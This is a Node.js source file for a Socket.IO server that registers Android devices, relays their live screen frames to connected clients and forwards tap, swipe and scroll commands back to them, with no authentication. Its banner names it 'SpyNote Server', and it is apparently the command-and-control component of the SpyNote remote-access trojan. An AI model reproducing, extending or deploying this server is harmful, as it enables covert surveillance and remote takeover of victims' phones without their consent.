const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 10000,
    pingInterval: 5000,
    maxHttpBufferSize: 100 * 1024 * 1024
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ limit: '100mb', extended: true }));

const devices = new Map();
const deviceSockets = new Map();

app.post('/register', (req, res) => {
    const { deviceId, model, brand, version, status } = req.body;
    if (deviceId) {
        devices.set(deviceId, { model, brand, version, status, connected: true });
        io.emit('devices-update', Array.from(devices.entries()));
        console.log("✅ Device registered:", deviceId);
    }
    res.json({ success: true });
});

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

io.on('connection', (socket) => {
    console.log('🔌 Client connected:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, 
                connected: true, 
                socketId: socket.id 
            });
            deviceSockets.set(deviceId, socket.id);
            socket.join(deviceId);
            io.emit('devices-update', Array.from(devices.entries()));
            console.log("📱 Device registered:", deviceId, "Socket:", socket.id);
        }
    });

    socket.on('screen-frame', (data) => {
        const deviceId = data.deviceId;
        if (devices.has(deviceId)) {
            socket.broadcast.emit('screen-update', {
                deviceId,
                data: data.data,
                width: data.width,
                height: data.height,
                timestamp: data.timestamp
            });
        }
    });

    // 🔥 PERFECT CONTROL HANDLER
    socket.on('control', (data) => {
        console.log('🎮 CONTROL RECEIVED:', JSON.stringify(data, null, 2));
        
        const { deviceId, action } = data;
        
        if (!deviceId || !devices.has(deviceId)) {
            console.log('❌ Invalid device:', deviceId);
            return;
        }

        const targetSocketId = deviceSockets.get(deviceId);
        if (!targetSocketId) {
            console.log('❌ Socket not found for:', deviceId);
            return;
        }

        // 🔥 FORWARD EXACT DATA TO DEVICE
        const controlData = {
            action: action,
            x: data.x,
            y: data.y,
            startX: data.startX,
            startY: data.startY,
            endX: data.endX,
            endY: data.endY
        };

        console.log('📱 FORWARDING TO DEVICE:', JSON.stringify(controlData, null, 2));
        
        // Send to specific socket AND room
        io.to(targetSocketId).emit('control', controlData);
        io.to(deviceId).emit('control', controlData);
        
        console.log('✅ CONTROL SENT to', deviceId);
    });

    socket.on('disconnect', () => {
        console.log('🔌 Client disconnected:', socket.id);
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                deviceSockets.delete(deviceId);
                io.emit('devices-update', Array.from(devices.entries()));
                console.log('📱 Device disconnected:', deviceId);
                break;
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 SpyNote Server: http://localhost:${PORT}`);
    console.log(`📱 TAP/SWIPE/SCROLL/BUTTONS READY!`);
});
